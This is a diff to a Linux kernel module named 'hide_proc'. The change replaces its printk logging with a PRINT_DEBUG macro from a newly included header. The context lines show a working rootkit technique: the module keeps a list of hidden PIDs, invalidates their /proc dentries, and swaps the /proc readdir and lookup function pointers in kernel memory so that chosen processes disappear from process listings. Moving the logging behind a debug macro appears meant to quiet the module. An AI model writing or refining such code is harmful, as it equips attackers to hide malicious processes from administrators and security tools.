@@ -8,6 +8,7 @@
 #include <linux/spinlock.h>
 #include <linux/namei.h> // For filp_open/filp_close
 #include <linux/path.h> // For kern_path and d_drop
+#include "version_control.h"
 
 // --- Original function pointers storage ---
 static int (*original_proc_root_readdir)(struct file *, struct dir_context *);
@@ -61,12 +62,12 @@ void add_hidden_pid(pid_t pid) {
     list_add(&new_entry->list, &hidden_pids);
     spin_unlock(&hidden_lock);
 
-    printk(KERN_INFO "[hide_proc] Added PID %d to hidden list\n", pid);
+    PRINT_DEBUG("[hide_proc] Added PID %d to hidden list\n", pid);
 
     // Invalidate dcache entry to force re-lookup
     snprintf(path_str, sizeof(path_str), "/proc/%d", (int)pid);
     if (kern_path(path_str, LOOKUP_FOLLOW, &path) == 0) {
-        printk(KERN_INFO "[hide_proc] Found dentry for %s, invalidating.\n", path_str);
+        PRINT_DEBUG("[hide_proc] Found dentry for %s, invalidating.\n", path_str);
         d_drop(path.dentry);
         path_put(&path);
     }
@@ -80,7 +81,7 @@ void remove_hidden_pid(pid_t pid) {
         if (entry->pid == pid) {
             list_del(&entry->list);
             kfree(entry);
-            printk(KERN_INFO "[hide_proc] Removed PID %d from hidden list\n", pid);
+            PRINT_DEBUG("[hide_proc] Removed PID %d from hidden list\n", pid);
             break;
         }
     }
@@ -97,7 +98,7 @@ void clear_hidden_pids(void) {
     }
     spin_unlock(&hidden_lock);
 
-    printk(KERN_INFO "[hide_proc] Cleared all hidden PIDs\n");
+    PRINT_DEBUG("[hide_proc] Cleared all hidden PIDs\n");
 }
 
 
@@ -178,11 +179,11 @@ int hide_proc_init(void) {
     void *new_readdir_ptr = &hooked_proc_root_readdir;
     void *new_lookup_ptr = &hooked_proc_root_lookup;
 
-    printk(KERN_INFO "[hide_proc] Initializing process hiding (via VFS pointer swap)\n");
+    PRINT_DEBUG("[hide_proc] Initializing process hiding (via VFS pointer swap)\n");
 
     proc_root_file = filp_open("/proc", O_RDONLY, 0);
     if (IS_ERR(proc_root_file)) {
-        printk(KERN_ERR "[hide_proc] Failed to open /proc\n");
+        PRINT_DEBUG("[hide_proc] Failed to open /proc\n");
         return PTR_ERR(proc_root_file);
     }
 
@@ -192,7 +193,7 @@ int hide_proc_init(void) {
     filp_close(proc_root_file, NULL);
 
     if (!proc_root_fops || !proc_root_iops) {
-        printk(KERN_ERR "[hide_proc] Failed to get /proc operations\n");
+        PRINT_DEBUG("[hide_proc] Failed to get /proc operations\n");
         return -EFAULT;
     }
 
@@ -200,13 +201,13 @@ int hide_proc_init(void) {
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
     original_proc_root_readdir = proc_root_fops->iterate_shared;
     if (remap_write_range(&proc_root_fops->iterate_shared, &new_readdir_ptr, sizeof(void *), true)) {
-        printk(KERN_ERR "[hide_proc] Failed to hook proc_root_readdir.\n");
+        PRINT_DEBUG("[hide_proc] Failed to hook proc_root_readdir.\n");
         return -EFAULT;
     }
 #else
     original_proc_root_readdir = proc_root_fops->readdir;
      if (remap_write_range(&proc_root_fops->readdir, &new_readdir_ptr, sizeof(void *), true)) {
-        printk(KERN_ERR "[hide_proc] Failed to hook proc_root_readdir.\n");
+        PRINT_DEBUG("[hide_proc] Failed to hook proc_root_readdir.\n");
         return -EFAULT;
     }
 #endif
@@ -214,7 +215,7 @@ int hide_proc_init(void) {
     // Hook lookup
     original_proc_root_lookup = proc_root_iops->lookup;
     if (remap_write_range(&proc_root_iops->lookup, &new_lookup_ptr, sizeof(void *), true)) {
-        printk(KERN_ERR "[hide_proc] Failed to hook proc_root_lookup.\n");
+        PRINT_DEBUG("[hide_proc] Failed to hook proc_root_lookup.\n");
         // Restore readdir hook on failure
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
         remap_write_range(&proc_root_fops->iterate_shared, &original_proc_root_readdir, sizeof(void *), true);
@@ -224,12 +225,12 @@ int hide_proc_init(void) {
         return -EFAULT;
     }
 
-    printk(KERN_INFO "[hide_proc] Successfully hooked /proc operations.\n");
+    PRINT_DEBUG("[hide_proc] Successfully hooked /proc operations.\n");
     return 0;
 }
 
 void hide_proc_exit(void) {
-    // printk(KERN_INFO "[hide_proc] Exiting process hiding (restoring VFS pointers)\n");
+    // PRINT_DEBUG("[hide_proc] Exiting process hiding (restoring VFS pointers)\n");
 
     if (proc_root_fops && original_proc_root_readdir) {
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
@@ -245,5 +246,5 @@ void hide_proc_exit(void) {
     }
 
     clear_hidden_pids();
-    printk(KERN_INFO "[hide_proc] Restored /proc operations.\n");
+    PRINT_DEBUG("[hide_proc] Restored /proc operations.\n");
 }
